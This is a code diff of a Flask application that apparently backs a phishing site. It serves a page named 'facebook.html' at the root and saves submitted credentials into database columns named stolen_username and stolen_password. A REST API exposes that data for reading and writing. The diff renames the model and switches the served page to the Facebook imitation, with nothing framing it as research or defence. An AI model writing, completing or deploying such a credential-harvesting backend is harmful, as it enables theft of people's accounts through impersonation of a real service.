@@ -4,24 +4,26 @@ from flask_sqlalchemy import SQLAlchemy
 from sqlalchemy import Column, Integer, Text
 
 app = Flask(__name__, static_url_path='')
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///username_password.db'
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
 db = SQLAlchemy(app)
 
 
-class Entry(db.Model):
+class User(db.Model):
     id = Column(Integer, primary_key=True)
     stolen_username = Column(Text, unique=False)
     stolen_password = Column(Text, unique=False)
 
+
 db.create_all()
 
 api_manager = APIManager(app, flask_sqlalchemy_db=db)
-api_manager.create_api(Entry, methods=['GET', 'POST', 'DEL', 'PUT'])
+api_manager.create_api(User, methods=['GET', 'POST', 'DEL', 'PUT'])
 
 
 @app.route("/")
 def login():
-    return app.send_static_file("login.html")
+    return app.send_static_file("facebook.html")
 
 app.debug = True
 
